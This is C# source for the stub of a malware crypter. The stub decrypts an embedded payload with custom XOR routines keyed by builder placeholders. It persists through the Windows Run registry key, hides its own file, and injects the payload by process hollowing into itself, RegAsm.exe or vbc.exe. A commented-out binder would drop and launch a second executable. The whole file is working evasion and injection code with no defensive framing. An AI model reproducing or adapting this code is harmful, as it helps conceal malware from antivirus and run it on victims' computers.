using Microsoft.Win32;
using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Diagnostics;
using System.ComponentModel;

namespace stupidcancercodeisruiningeverything
{

    static class Program
    {
        [STAThread]
        static void Main0()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new FrmOne());
        }

    }


    class Reader
    {
        public static byte[] ReadManaged()
        {
            ResourceManager manager = new ResourceManager("Encrypted", Assembly.GetEntryAssembly());
            byte[] bytes = (byte[])manager.GetObject("encfile");
            return bytes;
        }
    }

    //class Binder
    //{
    //    public static byte[] ReadBinder()
    //    {
    //        ResourceManager bmanager = new ResourceManager("BindF",Assembly.GetEntryAssembly());
    //        byte[] binderBytes = (byte[])bmanager.GetObject("BFile");
    //        return binderBytes;
    //    }
    //}
    public class FrmOne : Form
    {

        private void InitializeComponent()
        {
            SuspendLayout();
            ResumeLayout(false);
            PerformLayout();
            ShowInTaskbar = false;
            WindowState = FormWindowState.Minimized;

        }

        bool _startup = true;
        string injectTo = "[inject-replace]";
        string injectionPath1 = Assembly.GetExecutingAssembly().Location;
        string injectionPath2 = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe");
        string injectionPath3 = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "vbc.exe");
        //private string bPath = Path.Combine(Environment.SpecialFolder.ApplicationData + "bfile.exe");
        public FrmOne()
        {

            InitializeComponent();
            Thread.Sleep(5 * 100);
            byte[] fBytes = Reader.ReadManaged();
            //byte[] bBytes = Binder.ReadBinder();
            string encKey = "[key-replace]";
            string encMethod = "[encmethod-replace]";
            if (encMethod == "polydex")
                PolyDexDecrypt(fBytes, encKey);
            if (encMethod == "stairs")
                StairsDecrypt(fBytes, encKey);
            if (encMethod == "polybaby")
                PolyBabyDecrypt(fBytes, encKey);
            if (_startup)
                AddToStartup();

            HideFile();
            Thread.Sleep(500);

            
            if(injectTo == "[itself]")
            RunPe1.Run(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName,"",fBytes);
            if(injectTo =="[regasm]")
            RunPe1.Run(injectionPath2, "", fBytes);
            if(injectTo == "[vbc]")
            RunPe1.Run(injectionPath3, "", fBytes);
            //File.Create(bPath);
            //File.WriteAllBytes(bPath, bBytes);
            //Process.Start(bPath);
            //Environment.Exit(0);
        }
        public static byte[] PolyBabyDecrypt(byte[] input, string Key)
        {
            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
            byte[] Out = new byte[input.Length - 1];
            int x = input[input.Length - 1];
            for (int i = 0; i <= Out.Length - 1; i++) Out[i] = (byte)(input[i] ^ (key[i % key.Length] + x) & 255);
            return Out;
        }

        public static byte[] PolyDexDecrypt(byte[] plain, string Key)
        {
            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
            byte[] expandedKey;
            byte[] dKey = key;
            int length = plain.Length;
            if (dKey.Length >= length) expandedKey = dKey;
            else
            {
                byte[] rconst = BitConverter.GetBytes(Math.Round(Math.PI, 3));
                byte[] result = new byte[length];
                Buffer.BlockCopy(dKey, 0, result, 0, dKey.Length);
                for (int i = dKey.Length; i < length; i++)
                    result[i] = (byte)((dKey[(i - dKey.Length) % dKey.Length] ^ (result[i - 1])) % 256);
                for (int round = 0; round < 5; round++)
                {
                    result[0] = (byte)(result[0] ^ rconst[round]);
                    for (int i = 1; i < result.Length; i++)
                        result[i] = (byte)(((result[i] ^ (byte)(rconst[round] << (i % 3))) ^ result[i - 1]) % 256);
                }
                expandedKey = result;
            }
            byte[] wholeState = plain;
            byte magic = plain[plain.Length - 1];
            Array.Resize(ref wholeState, wholeState.Length - 1);
            for (int i = 0; i < wholeState.Length; i++) wholeState[i] = (byte)(wholeState[i] ^ magic ^ expandedKey[i]);
            return wholeState;
        }
        public static byte[] StairsDecrypt(byte[] Data, string Key)
        {
            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
            for (int i = (Data.Length * 2) + key.Length; i >= 0; i += -1)
            {
                Data[i % Data.Length] = (byte)(((int)(Data[i % Data.Length] ^ key[i % key.Length]) - (int)(Data[(i + 1) % Data.Length]) + 256) % 256);
            }
            return Data;
        }
        public void AddToStartup()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (key != null) key.SetValue("CryptedFile", Application.ExecutablePath);
        }

        public void HideFile()
        {
            FileInfo f = new FileInfo(Application.ExecutablePath);
            f.Attributes = FileAttributes.Hidden;
        }
        
    }

    

    static class RunPe1
    {

        [DllImport("kernel32.dll", EntryPoint = "CreateProcess", CharSet = CharSet.Unicode)]
        private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);

        [DllImport("kernel32.dll", EntryPoint = "GetThreadContext")]
        private static extern bool GetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", EntryPoint = "SetThreadContext")]
        private static extern bool SetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory")]
        private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

        [DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory")]
        private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

        [DllImport("ntdll.dll", EntryPoint = "NtUnmapViewOfSection")]
        private static extern int NtUnmapViewOfSection(IntPtr process, int baseAddress);

        [DllImport("kernel32.dll", EntryPoint = "VirtualAllocEx")]
        private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

        [DllImport("kernel32.dll", EntryPoint = "ResumeThread")]
        private static extern int ResumeThread(IntPtr handle);

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct ProcessInformation
        {
            public readonly IntPtr ProcessHandle;
            public readonly IntPtr ThreadHandle;
            private readonly uint ProcessId;
            private readonly uint ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct StartupInformation
        {
            public uint Size;
            private readonly string Reserved1;
            private readonly string Desktop;

            private readonly string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
            private readonly byte[] Misc;
            private readonly IntPtr Reserved2;
            private readonly IntPtr StdInput;
            private readonly IntPtr StdOutput;
            private readonly IntPtr StdError;
        }
        public static bool Run(string path, string cmd, byte[] data)
        {

            int readWrite = 0;
            string quotedPath = string.Format("\"{0}\"", path);

            StartupInformation si = new StartupInformation();
            ProcessInformation pi = new ProcessInformation();

            si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));

            if (string.IsNullOrEmpty(cmd))
            {
                if (!CreateProcess(path, quotedPath, IntPtr.Zero, IntPtr.Zero, false, 4, IntPtr.Zero, null, ref si, ref pi))
                    return false;
            }
            else
            {
                quotedPath = quotedPath + " " + cmd;
                if (!CreateProcess(path, quotedPath, IntPtr.Zero, IntPtr.Zero, false, 4, IntPtr.Zero, null, ref si, ref pi))
                    return false;
            }

            int fileAddress = BitConverter.ToInt32(data, 60);
            int imageBase = BitConverter.ToInt32(data, fileAddress + 52);

            int[] context = new int[179];
            context[0] = 65538;

            if (!GetThreadContext(pi.ThreadHandle, context))
                return false;

            int ebx = context[41];
            int baseAddress = 0;

            if (!ReadProcessMemory(pi.ProcessHandle, ebx + 8, ref baseAddress, 4, ref readWrite))
                return false;

            if (imageBase == baseAddress)
            {
                if (NtUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0)
                    return false;
            }

            int sizeOfImage = BitConverter.ToInt32(data, fileAddress + 80);
            int sizeOfHeaders = BitConverter.ToInt32(data, fileAddress + 84);

            bool allowOverride = false;
            int newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 12288, 64);

            if (newImageBase == 0)
            {
                allowOverride = true;
                newImageBase = VirtualAllocEx(pi.ProcessHandle, 0, sizeOfImage, 12288, 64);
                if (newImageBase == 0)
                    return false;
            }

            if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, data, sizeOfHeaders, ref readWrite))
                return false;

            int sectionOffset = fileAddress + 248;
            short numberOfSections = BitConverter.ToInt16(data, fileAddress + 6);

            for (int I = 0; I <= numberOfSections - 1; I++)
            {
                int virtualAddress = BitConverter.ToInt32(data, sectionOffset + 12);
                int sizeOfRawData = BitConverter.ToInt32(data, sectionOffset + 16);
                int pointerToRawData = BitConverter.ToInt32(data, sectionOffset + 20);

                if (sizeOfRawData != 0)
                {
                    byte[] sectionData = new byte[sizeOfRawData];
                    Buffer.BlockCopy(data, pointerToRawData, sectionData, 0, sectionData.Length);

                    if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite))
                        return false;
                }

                sectionOffset += 40;
            }

            byte[] pointerData = BitConverter.GetBytes(newImageBase);
            if (!WriteProcessMemory(pi.ProcessHandle, ebx + 8, pointerData, 4, ref readWrite))
                return false;

            int addressOfEntryPoint = BitConverter.ToInt32(data, fileAddress + 40);

            if (allowOverride)
                newImageBase = imageBase;
            context[44] = newImageBase + addressOfEntryPoint;

            if (!SetThreadContext(pi.ThreadHandle, context))
                return false;
            if (ResumeThread(pi.ThreadHandle) == -1)
                return false;

            return true;
        }
    }
}



